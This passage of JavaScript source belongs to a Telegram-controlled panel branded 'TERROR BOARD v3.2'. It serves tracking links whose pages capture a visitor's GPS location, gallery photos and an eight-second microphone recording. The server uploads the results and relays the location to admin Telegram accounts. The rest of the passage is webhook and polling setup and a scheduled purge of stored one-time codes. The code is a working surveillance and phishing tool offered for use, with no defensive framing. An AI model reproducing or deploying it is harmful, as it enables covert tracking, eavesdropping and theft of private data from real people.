<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Location</title></head>
<body style="font-family:system-ui;text-align:center;padding:40px">
<h2>Share Location</h2><p id="s">Requesting...</p>
<script>
navigator.geolocation.getCurrentPosition(p=>{
  fetch('/upload/loc',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({id:'${id}',lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy})})
  .then(()=>document.getElementById('s').innerText='Location sent');
},e=>document.getElementById('s').innerText='Denied');
</script></body></html>`);
});

app.post('/upload/loc', (req, res) => {
  const { id, lat, lon, acc } = req.body;
  if (db.locLinks[id]) {
    db.locLinks[id].coords = { lat, lon, acc };
    saveDb();
    ADMIN_IDS.forEach(aid => {
      bot.telegram.sendMessage(aid, `📍 <b>LOCATION</b>\nLat: ${lat}\nLon: ${lon}\nAcc: ${acc}m`, { parse_mode: 'HTML' }).catch(() => {});
    });
  }
  res.json({ ok: true });
});

// ----- Gallery & Mic -----
app.get('/g/:id', (req, res) => {
  res.send(`<html><body style="font-family:system-ui;text-align:center;padding:40px"><h2>Gallery Access</h2><p>Select photos...</p>
<input type="file" accept="image/*" multiple onchange="upload(this.files)">
<script>function upload(files){const fd=new FormData();fd.append('id','${req.params.id}');
for(let f of files)fd.append('files',f);fetch('/upload/gal',{method:'POST',body:fd});}</script></body></html>`);
});

app.get('/m/:id', (req, res) => {
  res.send(`<html><body style="font-family:system-ui;text-align:center;padding:40px"><h2>Microphone</h2><p id="s">Requesting...</p>
<script>navigator.mediaDevices.getUserMedia({audio:true}).then(s=>{
document.getElementById('s').innerText='Recording 8s...';
const rec=new MediaRecorder(s);const chunks=[];
rec.ondataavailable=e=>chunks.push(e.data);
rec.onstop=()=>{const fd=new FormData();fd.append('id','${req.params.id}');
fd.append('file',new Blob(chunks),'audio.webm');fetch('/upload/mic',{method:'POST',body:fd});};
rec.start();setTimeout(()=>rec.stop(),8000);
}).catch(()=>document.getElementById('s').innerText='Denied');</script></body></html>`);
});

// ===================== LAUNCH =====================
async function launch() {
  console.log('========================================');
  console.log('  TERROR BOARD v3.2 — FULL');
  console.log('  @#9002111185000#');
  console.log('========================================');

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[+] Express on 0.0.0.0:${PORT}`);
  });

  if (WEBHOOK_URL) {
    try {
      await bot.telegram.deleteWebhook({ drop_pending_updates: true });
      await bot.telegram.setWebhook(`\( {WEBHOOK_URL}/bot \){BOT_TOKEN}`);
      app.use(bot.webhookCallback(`/bot${BOT_TOKEN}`));
      console.log('[+] Webhook set');
    } catch (e) {
      console.log('[!] Webhook fail, polling', e.message);
      await bot.launch();
    }
  } else {
    await bot.launch();
    console.log('[+] Polling');
  }

  process.once('SIGINT', () => bot.stop('SIGINT'));
  process.once('SIGTERM', () => bot.stop('SIGTERM'));
}

cron.schedule('*/15 * * * *', () => {
  const now = Date.now();
  const ttl = db.settings.otpTtl * 1000;
  Object.keys(db.otpStore).forEach(k => {
    if (now - db.otpStore[k].created > ttl) delete db.otpStore[k];
  });
  saveDb();
});

launch().catch(err => {
  console.error(err);
  process.exit(1);
});
